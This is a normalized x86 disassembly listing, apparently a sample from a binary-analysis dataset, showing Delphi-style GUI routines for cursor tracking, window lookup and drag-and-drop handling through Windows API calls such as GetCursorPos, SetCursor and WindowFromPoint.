mov eax [ esi + 0x178 ]
call sub_416b18
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_416b74
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_43a398
mov edi eax
jmp r-xdata
sub_43301c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_432efc
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43d314
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_432f4c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_432f4c
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_434c50
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_432f4c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4527ec
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_43d2fc
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_432f88
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403360
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_43d3fc
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_43d314
jmp r-xdata
mov eax [ rw-data ]
call sub_43d470
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4527ec
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_434c50
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403360
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403360
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407c60
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_4332ec
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_432518
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43d314
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43301c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43345c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_433601
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403360
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403360
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_432820
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4332ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_432708
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43b8e8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_4156bc
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_434c24
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_4156bc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_433620
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403360
mov ebx eax
sub_433694
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_433960
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_4338ee
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_432560
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403314
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_433620
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_432f4c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_43d470
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4338f5
mov eax [ rw-data ]
call sub_403164
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44bae0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_4362b4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_432e18
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_44f74c
sub_4338f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4032f0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
sub_433984
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_431fec
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4339b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_433984
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_434c50
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_4391d4
test eax eax
je r-xdata
mov esi eax
sub_433a00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4169bc
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx ] eax
sub_433a28
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_416c5c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403164
xor eax eax
mov [ ebx ] eax
sub_433a48
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_433a78
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_416e84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_433b28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_433b01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_433cb4
call sub_403984
call sub_403984
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416b18
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_42025c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_433b34
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416e84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_433bd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433bd9
mov eax [ rw-data ]
call sub_416ee8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_433baa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_433cb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4202b8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416b18
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_42025c
test al al
je r-xdata
sub_433be0
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_433cb4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fed4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_433c0c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42043c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_420440
mov eax [ ebp - 0x4 ]
call sub_433d00
mov eax [ rw-data ]
call sub_416e84
mov ebx eax
xor eax eax
push ebp
push sub_433c91
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4169bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
call sub_433a78
sub_433cb4
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_420440
mov edx ebx
mov eax [ rw-data ]
call sub_416e98
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_433d00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_435744
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_433d2c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_433d68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4171a0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_433db0
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_433e6c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433f39
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433f40
lea eax [ ebp - 0x1c ]
call sub_403e9c
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403360
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44425c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403ef0
sub_433f5c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_433fc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_441328
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43510c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov edx [ eax + 0x64 ]
pop eax
call sub_4042a8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433fca
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov al 0x1
sub_433fd0
push ebx
mov ebx eax
mov eax ebx
call sub_441350
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434004
push ebx
mov ebx eax
mov eax ebx
call sub_4413a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4042a8
je r-xdata
mov al 0x1
pop ebx
retn
sub_43403c
push ebx
mov ebx eax
mov eax ebx
call sub_4413dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434070
push ebx
mov ebx eax
mov eax ebx
call sub_41cda8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43513c
sub_4340b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_4340d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403ef0
sub_4340fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43502c
sub_43411c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_434148
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
